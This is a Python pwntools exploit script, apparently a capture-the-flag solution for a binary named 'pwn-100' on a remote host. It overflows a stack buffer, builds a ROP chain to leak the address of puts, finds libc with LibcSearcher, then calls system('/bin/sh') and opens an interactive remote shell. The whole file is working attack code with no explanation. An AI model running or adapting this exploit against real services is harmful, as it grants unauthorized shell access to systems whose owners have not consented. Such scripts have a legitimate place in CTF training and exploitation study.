from pwn import *
from LibcSearcher import *
context(arch='amd64',os='linux',log_level='DEBUG')

# p = process('./pwn-100')
p = remote('124.126.19.106',50678)
elf = ELF('./pwn-100',checksec=False)

puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
main = 0x00000000004006B8

pop_rdi = 0x0000000000400763 # pop rdi ; ret

payload = 'A'*(0x40 + 8)
payload += flat([pop_rdi, puts_got, puts_plt, main])
payload = payload.ljust(200,'\x90')
p.send(payload)

p.recvuntil('bye~\n')
puts_addr = u64(p.recvuntil('\n',drop=True).ljust(8,'\x00'))
log.success('puts_addr = %#x',puts_addr)

libc = LibcSearcher('puts',puts_addr)
libc_base = puts_addr - libc.dump('puts')
system_addr = libc_base + libc.dump('system')
binsh = libc_base + libc.dump('str_bin_sh')
log.success('system_addr = %#x, binsh = %#x'%(system_addr, binsh))

payload = 'A'*(0x40 + 8)
payload += flat([pop_rdi, binsh, system_addr, main])
payload = payload.ljust(200,'\x90')
p.send(payload)
sleep(0.1)
p.interactive()
